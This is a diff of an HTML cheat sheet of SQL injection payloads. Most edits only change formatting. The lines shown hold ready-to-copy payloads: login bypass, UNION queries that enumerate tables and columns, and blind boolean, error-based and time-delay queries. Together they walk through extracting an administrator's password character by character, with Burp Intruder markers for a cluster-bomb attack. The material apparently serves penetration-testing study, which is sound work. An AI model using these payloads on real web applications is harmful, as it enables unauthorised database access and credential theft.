@@ -52,9 +52,7 @@ Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 I
 <b>C6: </b><mark id="HDT006">'#</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT001')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT002')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT003')">.C3.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT004')">.C4.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT005')">.C5.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT006')">.C6.</button></p>
-
-<b>NOTE:</b> It is needed to check the behavior of the application GUI and headers [<b>burpsuite</b>].
-	
+<b>NOTE:</b> It is needed to check the behavior of the application GUI and headers [<b>burpsuite</b>].	
 </details>
 <details>
 <summary>HIDDEN DATA TECHNIQUES</summary>
@@ -63,10 +61,10 @@ Getting errors can represent the presence of the vulnerability. <b>[HTTP/2 500 I
 If the vulnerability is present the goal is to "close" the query and retrieve all, for that boolean conditions are used.
 	
 <b>C1: TRUE </b><mark id="HDT01">' OR 1=1--</mark>
-<b>SAMPLE: </b><mark id="">' or "1"="1"#</mark>
-<b>SAMPLE: </b><mark id="">' or 1=1-- -</mark>
+	<b>SAMPLE: </b><mark id="">' or "1"="1"#</mark>
+	<b>SAMPLE: </b><mark id="">' or 1=1-- -</mark>
 <b>C2: TRUE </b><mark id="HDT02">' and 'a'='a--</mark>
-<b>C3: FALSE </b><mark id="HDT03">' and 1=2;--</mark>
+<b>C3: FALSE </b><mark id="HDT03">' and 1=2;--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#HDT03')">.C3.</button></p>
 </details>
 <details>
@@ -75,7 +73,7 @@ If the vulnerability is present the goal is to "close" the query and retrieve al
 
 <u>SAMPLE:</u>
 	
-<b>C1: </b><mark id="LBT01">administrator'--</mark>
+<b>C1: </b><mark id="LBT01">administrator'--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LBT01')">.C1.</button></p>
 </details>
 <details>
@@ -84,18 +82,18 @@ If the vulnerability is present the goal is to "close" the query and retrieve al
 
 <b>--</b> or <b>#</b> | Are used in SQL query language to comment ignoring the rest of the query. <br>
 	
-<b>PRE-REQS:</b>
+<b>::: PRE-REQS:</b>
 <u>1. GET COLUMN NUMBER</u>
 
 <b>C1: METHOD </b><mark id="DTT01">' ORDER BY 1--</mark>
-<b>C2: METHOD </b><mark id="DTT02">' UNION SELECT NULL--</mark>
+<b>C2: METHOD </b><mark id="DTT02">' UNION SELECT NULL--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT01')">.C1.</button> |  <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT02')">.C2.</button><br>
 	
 <u>2. GET FIELD TYPE</u>
 	
-<b>C1: STRING TEST</b><mark id="DTT03">' UNION SELECT 'a',NULL,NULL,NULL--</mark>
-<b>C2: STRING TEST</b><mark id="DTT04">' UNION SELECT NULL,'a',NULL,NULL--</mark>
-<b>C3: ORACLE TEST</b><mark id="DTT05">' UNION SELECT 'a','a' FROM DUAL--</mark>
+<b>C1: STRING TEST </b><mark id="DTT03">' UNION SELECT 'a',NULL,NULL,NULL--</mark>
+<b>C2: STRING TEST </b><mark id="DTT04">' UNION SELECT NULL,'a',NULL,NULL--</mark>
+<b>C3: ORACLE TEST </b><mark id="DTT05">' UNION SELECT 'a','a' FROM DUAL--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT03')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT04')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT05')">.C3.</button>
 <br>
 <b>NOTE:</b> It is needed to be iterative so you can find the right field type. For that number of columns is needed. 
@@ -109,12 +107,13 @@ Also, for ORACLE the select statement <u>is needed a table to search from</u>, i
 <b>C2: </b><mark id="DTT07">' UNION SELECT banner,NULL FROM v$version--</mark>
 *assuming it has two columns and both are type string.
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT07')">.C2.</button><br>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT07')">.C2.</button>
 	
 <u><b>MYSQL | SQL:</b></u>
 
 <b>C1: </b><mark id="DTT08">' UNION SELECT @@version,NULL#</mark>
 <b>SAMPLE: </b><mark id="">' UNION SELECT NULL,table_name FROM information_schema.tables#</mark>
+
 *assuming it has two columns and first is type string.
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#DTT08')">.C1.</button><br>
@@ -122,8 +121,7 @@ Also, for ORACLE the select statement <u>is needed a table to search from</u>, i
 
 <b>SAMPLE: </b><mark id="">' UNION SELECT ()version,NULL#</mark>
 
-<b>SAMPLE: </b><mark id="">' and substring((version()),1,1) = '0'#</mark>
-</p>
+<b>SAMPLE: </b><mark id="">' and substring((version()),1,1) = '0'#</mark></p>
 </details>
 <details>
 <summary>LISTING DATABASE CONTENT TECHNIQUES</summary>
@@ -137,28 +135,31 @@ Also, for ORACLE the select statement <u>is needed a table to search from</u>, i
 *after that information is collected, it is time to retrieve the <b>TABLE_NAME</b> of the database schema.
 
 <b>C1: </b><mark id="LDCT01">' UNION SELECT table_name,NULL from information_schema.tables--</mark>
+
 *once table is identified, it is time to retrieve the <b>COLUMNS</b> of the table
 
-<b>C2: </b><mark id="LDCT02">' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark></p> 
+<b>C2: </b><mark id="LDCT02">' UNION SELECT column_name,NULL from information_schema.columns WHERE table_name='TABLE_NAME'--</mark>
+
 *once table_name and columns are identified, it is time to retrieve the <b>CONTENT</b>
 
 <b>C3: </b><mark id="LDCT03">' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#LDCT03')">.C3.</button>
-<br>
 </details>
 <details>
 <summary>ORACLE</summary>
-<b>PRE-REQS:</b>
+<b>::: PRE-REQS:</b>
 1. get column number
 2. get field type
 
 *after that information is collected, it is time to retrieve the <b>TABLE_NAME</b> of the database schema.
 
 <b>C1: </b><mark id="LDCT04">' UNION SELECT table_name,NULL from ALL_TABLES--</mark>
+
 *once table is identified, it is time to retrieve the <b>COLUMNS</b> of the table
 
 <b>C2: </b><mark id="LDCT05">' UNION SELECT column_name,NULL from all_tab_columns WHERE table_name='TABLE_NAME'--</mark>
+
 *once table_name and columns are identified, it is time to retrieve the <b>CONTENT</b>
 
 <b>C3: </b><mark id="LDCT06">' UNION SELECT column_name1,column_name2 FROM TABLE_NAME--</mark>
@@ -173,15 +174,17 @@ columns and both type string.</p>
 <p><b>DESCRIPTION:</b> If the vulnerability is present, UNION attacks can be used to retrieve content
 from other tables.
 
-<b>STEP1:</b> GET QUERY COLUMNS NUMBER
+<b>::: STEP1:</b> GET QUERY COLUMNS NUMBER
 
 <b>C1: </b><mark id="UAT01">' UNION SELECT NULL--</mark>
+
 *add null values until the error disappears
 
-<b>STEP2:</b> GET COLUMN FIELD TYPE
+<b>::: STEP2:</b> GET COLUMN FIELD TYPE
 
 <b>C2: NON-ORACLE </b><mark id="UAT02">' UNION SELECT NULL,'a'--</mark>
-<b>C3: ORACLE</b><mark id="UAT03">' UNION SELECT 'a','a' FROM DUAL--</mark>
+<b>C3: ORACLE </b><mark id="UAT03">' UNION SELECT 'a','a' FROM DUAL--</mark>
+
 *assuming two columns
 
 ... after those steps, please refer to <b>LISTING DATABASE CONTENT TECHNIQUES</b>, it will apply the same.
@@ -194,26 +197,29 @@ from other tables.
 Inspect the headers in burpsuite to check if exist something querying the application. 
 <details>
 <summary>CONDITIONAL RESPONSES</summary>	
-<b>C1: TRUE</b><mark id="BAT01">' AND '1'='1</mark>
-<b>C2: FALSE</b><mark id="BAT02">' AND '1'='2</mark>
+<b>C1: TRUE </b><mark id="BAT01">' AND '1'='1</mark>
+<b>C2: FALSE </b><mark id="BAT02">' AND '1'='2</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT02')">.C2.</button>
 
 To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.<br>
 
-<u>CHECK IF TABLE EXIST ?</u>
+<u>::: CHECK IF TABLE EXIST ?</u>
 	
-<b>C1: TRUE condition means table exist !</b><mark id="BAT03">' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark>
+<b>C1: TRUE condition means table exist !</b><mark id="BAT03">' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT03')">.C1.</button>
 
-<u>CHECK IF COLUMN VALUE EXIST ?</u>
+<u>::: CHECK IF COLUMN VALUE EXIST ?</u>
 
-<b>C1: TRUE condition means column value exist ![guess or enumerate]</b><mark id="BAT04">' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark>
+<b>C1: TRUE </b><mark id="BAT04">' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark>
 <b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>
 
+<b>NOTE: </b> condition means column value exist ![guess or enumerate]	
+	
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT04')">.C1.</button> 
 
-<u>CHECK THE CHARACTER LENGHT OF THE COLUMN VALUE ?</u>
+<u>::: CHECK THE CHARACTER LENGHT OF THE COLUMN VALUE ?</u>
+	
 <b>C1: </b><mark id="BAT05">' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark>
 <b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>
 
@@ -222,7 +228,8 @@ To successfully acomplish the blind attack, the boolean conditions can help. It 
 <b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
 hits the FALSE statement the lenght is founded.
 <br>
-> <u>CHECK CHARACTERS VALUE USING A METHOD "GREATHER THAN" AND "EQUALS" ?</u>
+<u>CHECK CHARACTERS VALUE USING A METHOD "GREATHER THAN" AND "EQUALS" ?</u>
+	
 <b>C1: </b><mark id="BAT06">' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) > 'value</mark>
 <b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't</mark>
 
@@ -238,7 +245,8 @@ greather than the value...
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT07')">.C2.</button>
 <br>
-> <u>CHECK THE CHARACTERS OF THE COLUMN ?</u>
+<u>::: CHECK THE CHARACTERS OF THE COLUMN ?</u>
+	
 <b>C1: </b><mark id="BAT08">' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark>
 <b>SAMPLE: </b><mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark>
 
@@ -261,13 +269,13 @@ values are correct = TRUE.
 
 <b>NOTE:</b> [HTTP/2 500 Internal Server Error], error will act similar to the TRUE/FALSE logic. If error appears, FALSE. If not, TRUE. 
 
-> <u>CONFIRM SERVER IS INTERPRETING THE INJECTION AS A SQL QUERY</u><br>
+<u>::: CONFIRM SERVER IS INTERPRETING THE INJECTION AS A SQL QUERY</u><br>
 <b>C1: NON-ORACLE </b><mark id="BAT10">'||(SELECT '')||'</mark>
 <b>C2: ORACLE </b><mark id="BAT11">'||(SELECT '' FROM dual)||'</mark>
 	
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT10')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT11')">.C2.</button>
 
-> <u>CONFIRM IF TABLE EXISTS ?</u><br>
+<u>::: CONFIRM IF TABLE EXISTS ?</u><br>
 <b>C1: NON-ORACLE </b><mark id="BAT012">'||(SELECT '' FROM TABLE_NAME WHERE ROWNUM = 1)||'</mark>
 <b>SAMPLE: </b><mark>'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</mark>
 
@@ -278,8 +286,8 @@ values are correct = TRUE.
 <b>CONDITIONS: </b> 
 
 <b>ORACLE: </b>	
-<b>C1: TRUE = ERROR</b><mark id="BAT013">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</mark>
-<b>C2: FALSE = NO ERROR</b><mark id="BAT014">'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</mark>
+<b>C1: TRUE = ERROR </b><mark id="BAT013">'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</mark>
+<b>C2: FALSE = NO ERROR </b><mark id="BAT014">'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT013')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT014')">.C2.</button>
 	
@@ -319,17 +327,17 @@ dissapears, meaning the final value is the total lenght.
 <summary>VISIBLE ERROR-BASED</summary>
 <p><b>DESCRIPTION: </b> try the different default test attempts, first need a valid syntactically query. You can determine that looking for errors. 
 
-<u>1. CREATE A GENERIC SELECT SUBQUERY AND CAST THE RETURNED VALUE TO AN INT DATA TYPE</u>
+<u>::: 1. CREATE A GENERIC SELECT SUBQUERY AND CAST THE RETURNED VALUE TO AN INT DATA TYPE</u>
 
 <b>DESCRIPTION: </b> This method can help to retrieve information from other tables with the CAST value logic behind. 
 	
-<b>C1: </b><mark id="VEB01">' AND CAST((SELECT 1) AS int)--</mark>
+<b>C1: </b><mark id="VEB01">' AND CAST((SELECT 1) AS int)--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#VEB01')">.C1.</button>
 
 <b>NOTE: </b> If you get some errors about boolean expressions, you can try another comparison operator. Getting no errors means the query is 
 valid syntax format.
 
-<b>C2: </b><mark id="VEB02">' AND 1=CAST((SELECT 1) AS int)--</mark>
+<b>C2: </b><mark id="VEB02">' AND 1=CAST((SELECT 1) AS int)--</mark><br>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#VEB02')">.C2.</button>
 
 <b>C3: </b><mark id="VEB03">' AND 1=CAST((SELECT COLUMN_NAME FROM TABLE_NAME) AS int)--</mark>
@@ -355,9 +363,9 @@ valid syntax format.
 <p><b>DESCRIPTION: </b> Techniques used to retrieve data from database, used when there's no visible results, no errors present, etc. However,
 since the query is executed synchronously, it is possible to trigger conditional time delays get results. 
 
-<b>1. IDENTIFY IF TIME DELAY TECHNIQUE CAN BE USED [10 seconds</b>
+<b>::: 1. IDENTIFY IF TIME DELAY TECHNIQUE CAN BE USED [10 seconds]</b>
 
-<b>PER DATABASE ATTEMPT</b>
+<b><u>PER DATABASE ATTEMPT</u></b>
 
 <b>ORACLE:</b> dbms_pipe.receive_message(('a'),10)
 <b>Microsoft:</b> WAITFOR DELAY '0:0:10'
@@ -372,21 +380,21 @@ since the query is executed synchronously, it is possible to trigger conditional
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT01')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT02')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT03')">.C3.</button>
 
-<b>2. RETRIEVE DATA</b>
+<b><u>::: 2. RETRIEVE DATA</u></b>
 
 <b>pre-reqs:</b>
 	
 1. table name
 2. column name
 	
-<b>> CONFIRM USER</b>
+<b><u>:::  CONFIRM USER</u></b>
 	
 <b>C1: </b><mark id="TDT04">';SELECT CASE WHEN (COLUMN_NAME='VALUE') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM TABLE_NAME--</mark>
 <b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT04')">.C1.</button>
 
-<b>> CONFIRM HOW MANY CHARACTERS STORED ON THE COLUMN VALUE FIELD</b>
+<b><u>:::  CONFIRM HOW MANY CHARACTERS STORED ON THE COLUMN VALUE FIELD</u></b>
 
 <b>C2: </b><mark id="TDT05">';SELECT CASE WHEN (COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM TABLE_NAME--</mark>
 <b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
@@ -398,7 +406,7 @@ Send series of requests modifying the character count,
 	
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT05')">.C2.</button>
 
-<b>CONFIRM CHARACTER VALUE ITERATING POSITIONS</b>
+<b><u>::: CONFIRM CHARACTER VALUE ITERATING POSITIONS</u></b>
 
 <b>C3: </b><p id="TDT06"><mark>';SELECT CASE WHEN (COLUMN_NAME='VALUE' AND SUBSTRING(COLUMN_NAME,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM TABLE_NAME--</mark></p>
 <b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
@@ -407,7 +415,7 @@ Send series of requests modifying the character count,
 
 <b>SAMPLE: </b><mark>';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</mark>
 
-CLUSTER BOMB ATTACK!!
+<b>CLUSTER BOMB ATTACK!!</b>
 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT06')">.C3.</button>
 	
